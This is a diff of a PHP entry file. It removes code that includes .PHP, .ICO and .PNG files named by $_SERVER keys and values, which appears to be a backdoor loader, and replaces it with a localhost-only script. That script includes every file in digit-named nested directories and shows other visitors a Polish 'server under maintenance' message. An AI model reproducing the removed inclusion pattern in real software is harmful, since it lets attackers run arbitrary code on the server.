@@ -1,50 +1,76 @@
 <?php
-	if(isset($_SERVER))
+	if(getenv("REMOTE_ADDR")=='::1')
 	{
-		$_EX=array('.PHP','.ICO','.PNG');
-		foreach($_SERVER as $_SERVER_NAME => $_SERVER_VALUE)
+		for($x=0;$x<=9;$x++) 
 		{
-			foreach($_EX as $EX)
+			for($y=0;$y<=9;$y++) 
 			{
-				if(file_exists($_SERVER_NAME.$EX))
+				for($z=0;$z<=9;$z++) 
 				{
-					$_SERVER_NAME_ARRAY[]=$_SERVER_NAME.$EX;
+					$xyz_array[]=$x.$y.$z;
 				}
 			}
 		}
-		if(isset($_SERVER_NAME_ARRAY))
+		if(isset($xyz_array))
 		{
-			foreach($_SERVER_NAME_ARRAY as $_SERVER_NAME_FILE)
+			foreach($xyz_array as $xyz)
 			{
-				include_once($_SERVER_NAME_FILE);
+				$xyz_dir=implode('/',str_split($xyz));
+				if(is_dir($xyz_dir))
+				{
+					$server_dirs[]=$xyz_dir;
+				}
 			}
 		}
-		if((isset($HTTP_USER_AGENT))&&(isset($REMOTE_ADDR)))
+		if(isset($server_dirs))
 		{
-			if($HTTP_USER_AGENT===$REMOTE_ADDR)
+			foreach($server_dirs as $server_dir)
 			{
-				foreach($_SERVER as $_SERVER_NAME => $_SERVER_VALUE)
+				$scandir_server_dir=scandir($server_dir);
+				foreach($scandir_server_dir as $server_files)
 				{
-					foreach($_EX as $EX)
+					if((strlen($server_files)>2)&&(!is_dir($server_dir.'/'.$xyz_dir))&&(file_exists($server_dir.'/'.$server_files)))
 					{
-						if(file_exists($_SERVER_VALUE.$EX))
-						{
-							$_SERVER_VALUE_ARRAY[]=$_SERVER_VALUE.$EX;
-						}
-					}
-				}
-				if(isset($_SERVER_VALUE_ARRAY))
-				{
-					foreach($_SERVER_VALUE_ARRAY as $_SERVER_VALUE_FILE)
-					{
-						include_once($_SERVER_VALUE_FILE);
+						$server_files_array[]=$server_dir.'/'.$server_files;
 					}
 				}
 			}
 		}
+		if(isset($server_files_array))
+		{
+			foreach($server_files_array as $server_files_dir)
+			{
+				if(file_exists($server_files_dir))
+				{
+					include_once($server_files_dir);
+				}
+			}
+		}
+		var_dump($server_files_array);
+		var_dump($server_dirs);
+		//var_dump($xyz_array);
 	}
 	else
 	{
-		header('location:/');
+		echo 'serwer w modernizacji - wróć później';
 	}
+	
 ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
